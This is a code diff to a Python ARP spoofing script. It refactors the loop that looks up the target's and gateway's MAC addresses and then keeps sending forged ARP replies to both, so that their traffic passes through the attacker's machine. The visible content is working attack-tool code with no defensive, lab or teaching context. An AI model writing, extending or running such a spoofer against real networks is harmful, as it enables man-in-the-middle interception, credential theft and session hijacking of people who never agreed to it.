@@ -19,20 +19,26 @@ def get_mac(ip):
         return None
 
 
-target_mac = None
-while not target_mac:
-    target_mac = get_mac(target_ip)
-    if not target_mac:
-        print(f"Could not find MAC address for {target_ip}. Retrying...")
-gateway_mac = None
-while not gateway_mac:
-    gateway_mac = get_mac(gateway_ip)
-    if not gateway_mac:
-        print(f"Could not find MAC address for {gateway_ip}. Retrying...")
+def wait_til_mac(ip):
+    mac = None
+    while not mac:
+        mac = get_mac(ip)
+        if mac is None:
+            print(f"Waiting for MAC address of {ip}...")
+            time.sleep(1)
+    return mac
+
+
 try:
     while True:
-        spoof(target_ip=gateway_ip, target_mac=target_mac, spoof_ip=target_ip)
-        spoof(target_ip=target_ip, target_mac=gateway_mac, spoof_ip=gateway_ip)
+        spoof(
+            target_ip=gateway_ip,
+            target_mac=wait_til_mac(gateway_ip),
+            spoof_ip=target_ip,
+        )
+        spoof(
+            target_ip=target_ip, target_mac=wait_til_mac(target_ip), spoof_ip=gateway_ip
+        )
         time.sleep(1)
         print("spoofed")
 except KeyboardInterrupt:
